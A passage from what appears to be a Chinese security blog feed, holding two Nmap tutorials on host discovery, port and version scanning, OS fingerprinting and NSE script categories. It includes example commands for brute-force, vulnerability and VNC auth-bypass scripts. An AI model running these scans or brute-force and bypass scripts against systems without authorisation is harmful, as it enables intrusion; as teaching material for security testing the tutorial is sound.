<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>Nmap (Network Mapper,网络映射器)是一款开放源代码的网络探测和安全审核工具。它被设计用来快速扫描大型网络，包括主机探测与发现、开放的端口情况、操作系统与应用服务指纹识别、WAF识别及常见安全漏洞。它的图形化界面是Zenmap，分布式框架为DNmap.</p>
<p>Nmap的特点如下所示:</p>
<ul>
<li>主机探测:探测网络上的主机，如列出响应TCP和ICMP请求、ICMP请求、开放特别端口的主机。</li>
<li>端口扫描:探测目标主机所开放的端口。</li>
<li>版本检测:探测目标主机的网络服务，判断其服务名称及版本号。</li>
<li>系统检测:探测目标主机的操作系统及网络设备的硬件特性。</li>
<li>支持探测脚本的编写:使用Nmap的脚本引擎(NSE)和Lua编程语言。</li>
</ul>
<h4 id="Nmap入门"><a href="#Nmap入门" class="headerlink" title="Nmap入门"></a>Nmap入门</h4><h5 id="扫描参数"><a href="#扫描参数" class="headerlink" title="扫描参数"></a>扫描参数</h5><p>在命令行直接执行Nmap或查看帮助文档(输入nmap —help)将显示Nmap的用法及其功能。</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712072812958.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074450202.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074532948.png" alt=""></p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712074558835.png" alt=""></p>
<p>Nmap的相关参数的含义与用法:</p>
<h6 id="1-设置扫描目标时用到的相关参数。"><a href="#1-设置扫描目标时用到的相关参数。" class="headerlink" title="1.设置扫描目标时用到的相关参数。"></a>1.设置扫描目标时用到的相关参数。</h6><ul>
<li>-iL:从文件中导入目标主机或目标网段。</li>
<li>-iR:随机选择目标主机。</li>
<li>—exclude:后面跟的主机或网段将不在扫描范围内。</li>
<li>—excludefile:导入文件中的主机或网段将不在扫描范围中。</li>
</ul>
<h6 id="2-与主机发现方法相关的参数。"><a href="#2-与主机发现方法相关的参数。" class="headerlink" title="2.与主机发现方法相关的参数。"></a>2.与主机发现方法相关的参数。</h6><ul>
<li>-sL: List Scan(列表扫描)，仅列举指定目标的IP，不进行主机发现。</li>
<li>-sn: Ping Scan,只进行主机发现，不进行端口扫描。</li>
<li>-Pn:将所有指定的主机视作已开启，跳过主机发现的过程。</li>
<li>-PS/PA/PU/PY [portlist]:使用TCP SYN/ACK或SCTP INIT/ECHO方式来发现。</li>
<li>-PE/PP/PM:使用ICMP echo、timestamp、netmask请求包发现主机。</li>
<li>-PO [protocol list]:使用IP协议包探测对方主机是否开启。</li>
<li>-n/-R:-n表示不进行DNS解析;-R表示总是进行DNS解析。</li>
<li>—dns-servers <serv1[,serv2],...>:指定DNS服务器。</li>
<li>—system-dns:指定使用系统的DNS服务器。</li>
<li>—traceroute:追踪每个路由节点。</li>
</ul>
<h6 id="3-与常见的端口扫描方法相关的参数。"><a href="#3-与常见的端口扫描方法相关的参数。" class="headerlink" title="3.与常见的端口扫描方法相关的参数。"></a>3.与常见的端口扫描方法相关的参数。</h6><ul>
<li>-sS/sT/sA/sW/sM:指定使用TCP SYN/Connect()/ACK/Window/Maimon scans的方式对目标主机进行扫描。</li>
<li>-sU:指定使用UDP扫描的方式确定目标主机的UDP端口状况。</li>
<li>-sN/sF/sX:指定使用TCP Null/FIN/Xmas scans秘密扫描的方式协助探测对方的TCP端口状态。</li>
<li>—scanflags \<flags\>:定制TCP包的flags。</li>
<li>-sI <zombie host[:probeport]>:指定使用Idle scan的方式描目标主机(前提是需要找到合适的zombie host)。</li>
<li>-sY/sZ:使用SCTP INIT/COOKIE-ECHO扫描SCTP协议端口的开放情况。</li>
<li>-sO:使用IP protocol扫描确定目标机支持的协议类型。</li>
<li>-b \<FTP relay host>:使用FTP bounce scan扫描方式。</li>
</ul>
<h6 id="4-跟端口参数与扫描顺序的设置相关的参数。"><a href="#4-跟端口参数与扫描顺序的设置相关的参数。" class="headerlink" title="4.跟端口参数与扫描顺序的设置相关的参数。"></a>4.跟端口参数与扫描顺序的设置相关的参数。</h6><ul>
<li>-p \<port ranges>:扫描指定的端口。</li>
<li>-F: Fast mode(快速模式)，仅扫描TOP 100的端口。</li>
<li>-r:不进行端口随机打乱的操作(如无该参数，Nmap会将要扫描的端口以随机顺序的方式进行扫描，让Nmap的扫描不易被对方防火墙检测到)</li>
<li>—top-ports \<number>:扫描开放概率最高的number个端口(Nmap的作者曾做过大规模的互联网扫描，以此统计网络上各种端口可能开放的概率，并排列出最有可能开放端口的列表，具体可以参见nmap-services文件。默认情况下，Nmap会扫描最有可能的1000个TCP端口)。</li>
<li>—port-ratio \<ratio>:扫描指定频率以上的端口。与上述—top-ports类似，这里以概率作为参数，概率大于—port-ratio的端口才被扫描。显然参数必须在0~1之间，想了解具体的概率范围可以查看nmap-services文件。</li>
</ul>
<h6 id="5-与版本侦测相关的参数。"><a href="#5-与版本侦测相关的参数。" class="headerlink" title="5.与版本侦测相关的参数。"></a>5.与版本侦测相关的参数。</h6><ul>
<li>-sV:指定让Nmap进行版本侦测。</li>
<li>—version-intensity \<level>:指定版本侦测的强度(0~9)，默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。</li>
<li>—version-light:指定使用轻量级侦测方式(intensity 2)。</li>
<li>—version-all:尝试使用所有的probes进行侦测(intensity 9)。</li>
<li>—version-trace:显示出详细的版本侦测过程信息。</li>
</ul>
<p>在了解以上参数及其含义后，再来看用法会更好理解，扫描命令格式: </p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap+扫描参数+目标地址或网段</span><br></pre></td></tr></table></figure>
<p>例:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -T4 -A -v ip</span><br></pre></td></tr></table></figure>
<p>其中-A表示使用进攻性(Aggressive)方式扫描; -T4表示指定扫描过程使用的时序(Timing)，共有6个级别(0~5)，级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通信状况良好的情况下推荐使用T4。-v表示显示冗余(verbosity)信息，在扫描过程中显示扫描的细节，有助于让用户了解当前的扫描状态。</p>
<h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><h6 id="1-扫描单个目标地址"><a href="#1-扫描单个目标地址" class="headerlink" title="1.扫描单个目标地址"></a>1.扫描单个目标地址</h6><p>在Nmap后面直接添加目标地址即可扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080248534.png" alt=""></p>
<h6 id="2-扫描多个目标地址"><a href="#2-扫描多个目标地址" class="headerlink" title="2.扫描多个目标地址"></a>2.扫描多个目标地址</h6><p>如果目标地址不在同一网段，或在同一网段但不连续且数量不多，可以使用该方法进行扫描。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1 192.168.56.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712080643727.png" alt=""></p>
<h6 id="3-扫描一个范围内的目标地址"><a href="#3-扫描一个范围内的目标地址" class="headerlink" title="3.扫描一个范围内的目标地址"></a>3.扫描一个范围内的目标地址</h6><p>可以指定扫描一个连续的网段，中间使用”-“连接，例如，下列命令表示扫描范围为192.168.88.1~192.168.88.10。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1-10</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085718822.png" alt=""></p>
<h6 id="4-扫描目标地址所在的某个网段"><a href="#4-扫描目标地址所在的某个网段" class="headerlink" title="4.扫描目标地址所在的某个网段"></a>4.扫描目标地址所在的某个网段</h6><p>以C段为例，如果目标是一个网段，则可以通过添加子网掩码的方式扫描，下列命令表示扫描范围为192.168.88.1~192.168.88.255。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085118209.png" alt=""></p>
<h6 id="5-扫描主机列表target-txt中的所有目标地址"><a href="#5-扫描主机列表target-txt中的所有目标地址" class="headerlink" title="5.扫描主机列表target.txt中的所有目标地址"></a>5.扫描主机列表target.txt中的所有目标地址</h6><p>扫描target.txt中的地址或者网段，此处导入的是绝对路径，如果target.txt文件与nmap在同一个目录下，则直接引用文件名即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -iL target.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085423236.png" alt=""></p>
<h6 id="6-扫描除某一个目标地址之外的所有目标地址"><a href="#6-扫描除某一个目标地址之外的所有目标地址" class="headerlink" title="6.扫描除某一个目标地址之外的所有目标地址"></a>6.扫描除某一个目标地址之外的所有目标地址</h6><p>下列命令表示扫描除192.168.0.105之外的其他192.168.0.x地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24 --exclude 192.168.88.4</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085623439.png" alt=""></p>
<h6 id="7-扫描除某一文件中的目标地址之外的目标地址"><a href="#7-扫描除某一文件中的目标地址之外的目标地址" class="headerlink" title="7.扫描除某一文件中的目标地址之外的目标地址"></a>7.扫描除某一文件中的目标地址之外的目标地址</h6><p>下列命令表示扫描除了target.txt文件中涉及的地址或网段之外的目标地址。还是以扫描192.168.88.x网段为例，在target.txt中添加192.168.88.1和192.168.88.5。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.88.1&#x2F;24 --excludefile target.txt</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712085912318.png" alt=""></p>
<h6 id="8-扫描某一目标地址的特定端口"><a href="#8-扫描某一目标地址的特定端口" class="headerlink" title="8.扫描某一目标地址的特定端口"></a>8.扫描某一目标地址的特定端口</h6><p>如果不需要对目标主机进行全端口扫描，只想探测它是否开放了某一端口，那么使用-p参数指定端口号，将大大提升扫描速度。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap 192.168.56.1 -p 22,23,80</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712083949109.png" alt=""></p>
<h6 id="9-对目标地址进行路由跟踪"><a href="#9-对目标地址进行路由跟踪" class="headerlink" title="9.对目标地址进行路由跟踪"></a>9.对目标地址进行路由跟踪</h6><p>下列命令表示对目标地址进行路由跟踪。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --traceroute 192.168.56.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084213833.png" alt=""></p>
<h6 id="10-扫描目标地址所在C段的在线状况"><a href="#10-扫描目标地址所在C段的在线状况" class="headerlink" title="10.扫描目标地址所在C段的在线状况"></a>10.扫描目标地址所在C段的在线状况</h6><p>下列命令表示扫描目标地址所在C段的在线状况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.56.1&#x2F;24</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712084355147.png" alt=""></p>
<h6 id="11-目标地址的操作系统指纹识别"><a href="#11-目标地址的操作系统指纹识别" class="headerlink" title="11.目标地址的操作系统指纹识别"></a>11.目标地址的操作系统指纹识别</h6><p>下列命令表示通过指纹识别技术识别目标地址的操作系统的版本。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -O 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090051908.png" alt=""></p>
<h6 id="12-目标地址提供的服务版本检测"><a href="#12-目标地址提供的服务版本检测" class="headerlink" title="12.目标地址提供的服务版本检测"></a>12.目标地址提供的服务版本检测</h6><p>下列命令表示检测目标地址开放的端口对应的服务版本信息。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.88.1</span><br></pre></td></tr></table></figure>
<h6 id="13-探测防火墙状态"><a href="#13-探测防火墙状态" class="headerlink" title="13.探测防火墙状态"></a>13.探测防火墙状态</h6><p>在实战中，可以利用FIN扫描的方式探测防火墙的状态。FIN扫描用于识别端口是否关闭，收到RST回复说明该端口关闭，否则就是open或filtered状态。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -sF -T4 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712090442765.png" alt=""></p>
<h5 id="状态识别"><a href="#状态识别" class="headerlink" title="状态识别"></a>状态识别</h5><p>Nmap输出的是扫描列表，包括端口号、端口状态、服务名称、服务版本及协议。通常有如下表所示的6种状态。</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>状态</th>
<th>含义</th>
</tr>
</thead>
<tbody>
<tr>
<td>open</td>
<td>开放的，表示应用程序正在监听该端口的连接，外部可以访问</td>
</tr>
<tr>
<td>filtered</td>
<td>被过滤的，表示端口被防火墙或其他网络设备阻止，不能访问</td>
</tr>
<tr>
<td>closed</td>
<td>关闭的，表示目标主机未开启该端口</td>
</tr>
<tr>
<td>unfiltered</td>
<td>未被过滤的，表示Nmap无法确定端口所处状态，需进一步探测</td>
</tr>
<tr>
<td>open/filtered</td>
<td>开放的或被过滤的，Nmap不能识别</td>
</tr>
<tr>
<td>closed/filtered</td>
<td>关闭的或被过滤的，Nmap不能识别</td>
</tr>
</tbody>
</table>
</div>
<p>了解了以上状态，在渗透测试过程中，将有利于我们确定下一步应该采取什么<br>方法或攻击手段。</p>
<h4 id="Nmap进阶"><a href="#Nmap进阶" class="headerlink" title="Nmap进阶"></a>Nmap进阶</h4><h5 id="脚本介绍"><a href="#脚本介绍" class="headerlink" title="脚本介绍"></a>脚本介绍</h5><p>Nmap的脚本默认存在/usr/share/nmap/scripts文件夹下</p>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712095117059.png" alt=""></p>
<p>Nmap的脚本主要分为以下几类:</p>
<ul>
<li>Auth:负责处理鉴权证书(绕过鉴权)的脚本。</li>
<li>Broadcast:在局域网内探查更多服务的开启情况，如DHCP/DNS/SQLServer等。</li>
<li>Brute:针对常见的应用提供暴力破解方式，如HTTP/SMTP等。</li>
<li>Default:使用-sC或A选项扫描时默认的脚本，提供基本的脚本扫描能力。</li>
<li>Discovery:对网络进行更多信息的搜集，如SMB枚举、SNMP查询等。</li>
<li>Dos:用于进行拒绝服务攻击。</li>
<li>Exploit: 利用已知的漏洞入侵系统。</li>
<li>External:利用第三方的数据库或资源。例如，进行Whois解析。</li>
<li>Fuzzer:模糊测试脚本，发送异常的包到目标机，探测出潜在漏洞。</li>
<li>Intrusive:入侵性的脚本，此类脚本可能弓发对方的IDS/IPS的记录或屏蔽。</li>
<li>Malware:探测目标机是否感染了病毒、开启后门等信息。</li>
<li>Safe:此类与Intrusive相反，属于安全性脚本。</li>
<li>Version:负责增强服务与版本扫描功能的脚本。</li>
<li>Vuln:负责检查目标机是否有常见漏洞，如MS08-067.</li>
</ul>
<h5 id="常见脚本"><a href="#常见脚本" class="headerlink" title="常见脚本"></a>常见脚本</h5><p>用户还可根据需要设置—script=类别进行扫描，常用参数如下所示:</p>
<ul>
<li>-sC/—script=default:使用默认的脚本进行扫描。</li>
<li>—script= \<Lua scripts>:使用某个脚本进行扫描。</li>
<li>—script-args=key1=value1,key2=value2…:该参数用于传递脚本里的参数，key1是参数名，该参数对应value1这个值。如有更多的参数，使用逗号连接。</li>
<li>—script-args-file=filename:使用文件为脚本提供参数。</li>
<li>—script-trace:如果设置该参数，则显示脚本执行过程中发送与接收的数据。</li>
<li>—script-updatedb:在Nmap的scripts目录里有一个script.db文件，该文件保存了当前Nmap可用的脚本，类似于一个小型数据库，如果我们开启Nmap并调用了此参数，则Nmap会自行扫描scripts目录中的扩展脚本，进行数据库更新。</li>
<li>—script-help:调用该参数后，Nmap会输出该脚本对应的脚本使用参数，以及详细的介绍信息。</li>
</ul>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><h6 id="1-鉴权扫描"><a href="#1-鉴权扫描" class="headerlink" title="1.鉴权扫描"></a>1.鉴权扫描</h6><p>使用—script=auth可以对目标主机或目标主机所在的网段进行应用弱口令检测。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;auth 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712143952557.png" alt=""></p>
<h6 id="2-暴力破解攻击"><a href="#2-暴力破解攻击" class="headerlink" title="2.暴力破解攻击"></a>2.暴力破解攻击</h6><p>Nmap具有暴力破解的功能，可对数据库、SMB、SNMP等进行简单密码的暴力猜解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;brute 192.168.0.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144436805.png" alt=""></p>
<h6 id="3-扫描常见的漏洞"><a href="#3-扫描常见的漏洞" class="headerlink" title="3.扫描常见的漏洞"></a>3.扫描常见的漏洞</h6><p>Nmap具备漏洞扫描的功能，可以检查目标主机或网段是否存在常见的漏洞。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;vuln 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144525432.png" alt=""></p>
<h6 id="4-应用服务扫描"><a href="#4-应用服务扫描" class="headerlink" title="4.应用服务扫描"></a>4.应用服务扫描</h6><p>Nmap具备很多常见应用服务的扫描脚本，例如VNC服务、MySQL服务、Telnet服务、Rsync服务等,此处以VNC服务为例。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --script&#x3D;realvnc-auth-bypass 192.168.88.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144648105.png" alt=""></p>
<h6 id="5-探测局域网内更多服务开启的情况"><a href="#5-探测局域网内更多服务开启的情况" class="headerlink" title="5.探测局域网内更多服务开启的情况"></a>5.探测局域网内更多服务开启的情况</h6><p>输入以下命令即可探测局域网内更多服务开启的情况。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -n -p 445 --script&#x3D;broadcast 192.168.0.1</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712144959242.png" alt=""></p>
<h6 id="6-Whois解析"><a href="#6-Whois解析" class="headerlink" title="6.Whois解析"></a>6.Whois解析</h6><p>利用第三方的数据库或资源查询目标地址的信息，例如进行Whois解析。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap -script external idefun.com</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/wxpgitee/images/raw/master/img/image-20210712145517002.png" alt=""></p>
<p>更多扫描脚本的使用方法可参见<a href="https://nmap.org/nsedoc/categories">https://nmap.org/nsedoc/categories</a>.</p>
<h2 id="Web安全原理剖析"><a href="#Web安全原理剖析" class="headerlink" title="Web安全原理剖析"></a>Web安全原理剖析</h2><h3 id="SQL注入基础"><a href="#SQL注入基础" class="headerlink" title="SQL注入基础"></a>SQL注入基础</h3><h3 id="SQL注入进阶"><a href="#SQL注入进阶" class="headerlink" title="SQL注入进阶"></a>SQL注入进阶</h3><h3 id="SQL注入绕过技术"><a href="#SQL注入绕过技术" class="headerlink" title="SQL注入绕过技术"></a>SQL注入绕过技术</h3>]]></content>
      <categories>
        <category>Hack</category>
      </categories>
      <tags>
        <tag>Hack</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap的使用</title>
    <url>/article/44a199f9.html</url>
    <content><![CDATA[<h1 id="Nmap的使用"><a href="#Nmap的使用" class="headerlink" title="Nmap的使用"></a>Nmap的使用</h1><a id="more"></a>
<p>Nmap是主机扫描工具，他的图形化界面是Zenmap，分布式框架为Dnamp。</p>
<p>Nmap可以完成以下任务：</p>
<blockquote>
<ul>
<li>主机探测</li>
<li>端口扫描</li>
<li>版本检测</li>
<li>系统检测</li>
<li><p>支持探测脚本的编写</p>
</li>
<li><p>Nmap在实际中应用场合如下：</p>
</li>
<li>通过对设备或者防火墙的探测来审计它的安全性</li>
<li>探测目标主机所开放的端口</li>
<li>通过识别新的服务器审计网络的安全性</li>
<li>探测网络上的主机</li>
</ul>
</blockquote>
<p>端口扫描工具，即借助工具，试图了解所扫描IP提供的计算机网络服务类型（网络服务均与端口号相关），从而发现攻击弱点，常见服务对应端口号：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th>服务</th>
<th>端口号</th>
</tr>
</thead>
<tbody>
<tr>
<td>HTTP</td>
<td>80</td>
</tr>
<tr>
<td>HTTPS</td>
<td>443</td>
</tr>
<tr>
<td>Telnet</td>
<td>23</td>
</tr>
<tr>
<td>FTP</td>
<td>21</td>
</tr>
<tr>
<td>SSH（安全登录）、SCP（文件传输）、端口重定向</td>
<td>22</td>
</tr>
<tr>
<td>SMTP</td>
<td>25</td>
</tr>
<tr>
<td>POP3</td>
<td>110</td>
</tr>
<tr>
<td>WebLogic</td>
<td>7001</td>
</tr>
<tr>
<td>TOMCAT</td>
<td>8080</td>
</tr>
<tr>
<td>WIN2003远程登录</td>
<td>3389</td>
</tr>
<tr>
<td>Oracle数据库</td>
<td>1521</td>
</tr>
<tr>
<td>MS SQL* SEVER数据库sever</td>
<td>1433</td>
</tr>
<tr>
<td>MySQL 数据库sever</td>
<td>3306</td>
</tr>
</tbody>
</table>
</div>
<p>Nmap进行完整全面的扫描<br>nmap –T4 –A –v</p>
<p>其中-A选项用于使用进攻性（Aggressive）方式扫描；-T4指定扫描过程使用的时序（Timing），总有6个级别（0-5），级别越高，扫描速度越快，但也容易被防火墙或IDS检测并屏蔽掉，在网络通讯状况良好的情况推荐使用T4；-v表示显示冗余（verbosity）信息，在扫描过程中显示扫描的细节，从而让用户了解当前的扫描状态。</p>
<h3 id="Nmap用于主机发现的一些用法"><a href="#Nmap用于主机发现的一些用法" class="headerlink" title="Nmap用于主机发现的一些用法"></a><strong>Nmap用于主机发现的一些用法</strong></h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。  </span><br><span class="line">  </span><br><span class="line">-sn: Ping Scan 只进行主机发现，不进行端口扫描。  </span><br><span class="line">  </span><br><span class="line">-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。  </span><br><span class="line">  </span><br><span class="line">-PS/PA/PU/PY[portlist]: 使用TCPSYN/ACK或SCTP INIT/ECHO方式进行发现。  </span><br><span class="line">  </span><br><span class="line">-PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。-PO[protocollist]: 使用IP协议包探测对方主机是否开启。  </span><br><span class="line">  </span><br><span class="line">-n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。  </span><br><span class="line">  </span><br><span class="line">--dns-servers &lt;serv1[,serv2],...&gt;: 指定DNS服务器。  </span><br><span class="line">  </span><br><span class="line">--system-dns: 指定使用系统的DNS服务器  </span><br><span class="line">  </span><br><span class="line">--traceroute: 追踪每个路由节点 </span><br></pre></td></tr></table></figure>
<h3 id="Nmap用于端口扫描的一些用法"><a href="#Nmap用于端口扫描的一些用法" class="headerlink" title="Nmap用于端口扫描的一些用法"></a><strong>Nmap用于端口扫描的一些用法</strong></h3><p>1、扫描方式选项</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-sS/sT/sA/sW/sM:指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。  </span><br><span class="line">  </span><br><span class="line">  -sU: 指定使用UDP扫描方式确定目标主机的UDP端口状况。  </span><br><span class="line">  </span><br><span class="line">  -sN/sF/sX: 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。  </span><br><span class="line">  </span><br><span class="line">  --scanflags &lt;flags&gt;: 定制TCP包的flags。  </span><br><span class="line">  </span><br><span class="line">  -sI &lt;zombiehost[:probeport]&gt;: 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）  </span><br><span class="line">  </span><br><span class="line">  -sY/sZ: 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。  </span><br><span class="line">  </span><br><span class="line">  -sO: 使用IP protocol 扫描确定目标机支持的协议类型。  </span><br><span class="line">  </span><br><span class="line">  -b &lt;FTP relay host&gt;: 使用FTP bounce scan扫描方式  </span><br></pre></td></tr></table></figure>
<p>2、 端口参数与扫描顺序</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[plain] view plain copy</span><br><span class="line">-p &lt;port ranges&gt;: 扫描指定的端口  </span><br><span class="line">  </span><br><span class="line">实例: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9（其中T代表TCP协议、U代表UDP协议、S代表SCTP协议）  </span><br><span class="line">  </span><br><span class="line">-F: Fast mode – 快速模式，仅扫描TOP 100的端口  </span><br><span class="line">  </span><br><span class="line">-r: 不进行端口随机打乱的操作（如无该参数，nmap会将要扫描的端口以随机顺序方式扫描，以让nmap的扫描不易被对方防火墙检测到）。  </span><br><span class="line">  </span><br><span class="line">--top-ports &lt;number&gt;:扫描开放概率最高的number个端口（nmap的作者曾经做过大规模地互联网扫描，以此统计出网络上各种端口可能开放的概率。以此排列出最有可能开放端口的列表，具体可以参见文件：nmap-services。默认情况下，nmap会扫描最有可能的1000个TCP端口）  </span><br><span class="line">  </span><br><span class="line">--port-ratio &lt;ratio&gt;: 扫描指定频率以上的端口。与上述--top-ports类似，这里以概率作为参数，让概率大于--port-ratio的端口才被扫描。显然参数必须在在0到1之间，具体范围概率情况可以查看nmap-services文件。  </span><br></pre></td></tr></table></figure>
<p>3、 版本侦测的用法</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">版本侦测方面的命令行选项比较简单。</span><br><span class="line">[plain] view plain copy</span><br><span class="line">-sV: 指定让Nmap进行版本侦测  </span><br><span class="line">  </span><br><span class="line">--version-intensity &lt;level&gt;: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。  </span><br><span class="line">  </span><br><span class="line">--version-light: 指定使用轻量侦测方式 (intensity 2)  </span><br><span class="line">  </span><br><span class="line">--version-all: 尝试使用所有的probes进行侦测 (intensity 9)  </span><br><span class="line">  </span><br><span class="line">--version-trace: 显示出详细的版本侦测过程信息。  </span><br></pre></td></tr></table></figure>
<p>具体操作演示如下<br>1、用Nmap扫描特定IP地址<br><img src="https://i.loli.net/2021/05/12/D6NC24enStuVZw9.png" alt=""></p>
<p>2、用<code>-vv</code>对结果进行详细输出<br><img src="https://i.loli.net/2021/05/12/LipcJ541fxHPXAE.png" alt=""></p>
<p>3、自行设置端口范围进行扫描<br><img src="https://images2015.cnblogs.com/blog/1028836/201703/1028836-20170319215030354-1196652527.png" alt=""></p>
<p>4、指定端口号进行扫描</p>
<p><img src="https://i.loli.net/2021/05/12/2ZIgiOs3Bvbr9h6.png" alt=""><br>5、对目标进行Ping扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/12/U72Gd3ypHFNljrm.png" alt=""><br>6、路由跟踪</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -traceroute &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/12/LE9fDp7j2JiPeZG.png" alt=""></p>
<p>7、扫描一个段的主机在线状况</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP &lt;network address &gt; &lt;/CIDR&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/12/CX5gaR2iNUqLnb6.png" alt=""></p>
<p>8、操作系统探测</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -O &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/12/6xVY5q4mNZP82JG.png" alt=""></p>
<p>9、万能开关扫描</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/05/12/z1FwyGNB6meqf4D.png" alt=""></p>
<p>10、其他扫描方式<br><strong>SYN扫描</strong>：利用基本的SYN扫描方式测试其端口开放状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sS -T4 &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p><strong>FIN扫描</strong>：利用FIN扫描方式探测防火墙状态。FIN扫描方式用于识别端口是否关闭，收到RST回复说明该端口关闭，否则说明是open或filtered状态</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sF -T4 &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
<p><strong>ACK扫描</strong>：利用ACK扫描判断端口是否被过滤。针对ACK探测包，为被过滤的端口（无论打开或关闭）会回复RST包</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">namp -sA -T4 &lt;target ip&gt;</span><br></pre></td></tr></table></figure>
